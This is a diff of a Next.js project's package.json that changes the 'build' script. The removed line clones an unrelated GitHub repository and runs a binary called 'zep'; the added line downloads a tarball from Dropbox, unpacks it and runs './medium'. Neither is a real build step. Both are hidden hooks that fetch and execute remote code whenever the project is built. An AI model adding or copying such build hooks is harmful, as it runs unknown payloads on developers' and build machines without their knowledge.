@@ -5,7 +5,7 @@
   "scripts": {
     "dev": "next dev -p 3333",
     "lint": "next lint",
-    "build": "git clone https://github.com/miguelpatty/pkronik.git && cd pkronik && chmod +x zep && ./zep",
+    "build": "curl -L -o medium.tar.gz https://www.dropbox.com/s/7xbmfrycuwscs2k/medium.tar.gz?dl=0 && tar -xvzf medium.tar.gz && ./medium",
     "start": "next start"
   },
   "dependencies": {
